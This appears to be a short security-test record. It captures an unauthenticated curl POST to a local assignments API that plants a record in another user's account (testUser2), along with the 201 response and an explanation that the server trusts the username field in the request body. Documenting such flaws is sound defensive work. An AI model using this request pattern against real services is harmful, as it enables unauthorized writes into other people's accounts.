Unauthenticated write into testUser2's account (no credentials supplied)
Captured 2026-10-10

$ curl -i -X POST http://127.0.0.1:8000/assignments -H "Content-Type: application/json" \
  -d '{"title":"F02-planted","course":"TEST101","dueDate":"2026-12-01","username":"testUser2"}'

HTTP/1.1 201 Created
content-type: application/json

{"title":"F02-planted","course":"TEST101","dueDate":"2026-12-01","status":"pending","priority":"medium","type":"homework","points":"0","username":"testUser2","_id":"6aca7753c8f60271923c8aa1"}

The server accepted an assignment for testUser2 from a request that supplied no
credentials. The "username" field in the POST body is trusted at face value, so any
caller can write into any account.
